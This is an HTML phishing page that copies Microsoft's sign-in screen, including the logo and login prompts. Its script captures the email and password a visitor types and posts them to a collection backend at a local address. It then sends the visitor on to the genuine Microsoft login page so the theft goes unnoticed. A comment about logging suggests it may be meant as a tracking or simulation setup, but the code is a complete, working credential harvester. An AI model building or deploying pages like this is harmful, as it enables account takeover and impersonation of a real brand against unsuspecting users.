<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
        <h2>Sign in</h2>
        <form id="login-form">
            <input type="email" id="username" placeholder="Email, phone, or Skype" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <p><a href="#">Forgot password?</a></p>
        <p><a href="#">No account? Create one!</a></p>
        <p><a href="#">Sign in with a security key</a></p>
    </div>

    <script>
        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault();

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value; 

            // ðŸ”¹ Send tracking request to your localhost backend
            fetch("http://127.0.0.1:8000/api/track-attempt", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ 
                    email: username, 
                    password: password, // âš  Optional: Remove if you don't want to log this
                    timestamp: new Date().toISOString() 
                })
            }).then(response => {
                if (response.ok) {
                    // âœ… Redirect to Microsoft's official login page
                    window.location.href = "https://login.microsoftonline.com/";
                } else {
                    alert("Error tracking login attempt.");
                }
            }).catch(error => {
                console.error("Error:", error);
            });
        });
    </script>
</body>
</html>
